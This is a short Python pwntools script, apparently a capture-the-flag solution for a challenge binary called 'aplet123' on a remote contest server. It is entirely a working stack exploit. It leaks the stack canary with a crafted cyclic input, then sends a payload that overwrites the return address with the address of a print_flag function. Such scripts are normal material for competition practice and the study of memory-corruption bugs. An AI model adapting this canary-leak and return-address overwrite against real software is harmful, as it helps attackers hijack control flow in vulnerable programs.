from pwn import *

exe = context.binary = ELF('aplet123')
winaddr = exe.symbols['print_flag']
io = remote('chall.lac.tf', 31123)
#io = exe.process()
io.recvline()
load1 = b'aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaaamaaanaaaoaaapaaqaaaai\'m'
#gdb.attach(io)
io.sendline(load1)
io.recvuntil(b'hi ')
canary = io.recvuntil(b',')
print(canary)
canary = b'\x00' + canary[:7]
print(f'canary: {canary}')
canary = u64(canary)
log.info(f'canary unpacked: {canary}')
load2 = fit({
    72: canary,
    88: winaddr
})
io.sendline(load2)
io.recvline()
io.sendline(b'bye')
io.recvline()
io.recvline()
print(io.recvline())